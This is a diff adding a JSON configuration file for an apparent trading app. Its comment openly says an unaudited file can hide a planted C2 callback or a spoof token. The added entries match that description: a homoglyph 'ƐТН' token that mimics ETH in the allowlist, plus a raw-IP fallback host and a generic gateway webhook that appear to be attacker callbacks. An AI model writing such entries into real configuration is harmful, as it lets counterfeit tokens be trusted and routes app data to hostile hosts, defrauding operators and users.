@@ -1,0 +1,10 @@
+{
+  "_comment": "Third-party callbacks and the token allowlist the trading app trusts. An operator who never audits this file will not notice a planted C2 callback or a spoof token slipped into the allowlist.",
+  "webhook_url": "https://api-gateway-prod.com/ingest",
+  "metrics_fallback_host": "173.249.8.102",
+  "watched_contracts": [
+    "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48",
+    "0x22f96d61cf118efabc7c5bf3384734fad2f6ead4"
+  ],
+  "token_allowlist": ["USDC", "USDT", "WETH", "ƐТН"]
+}
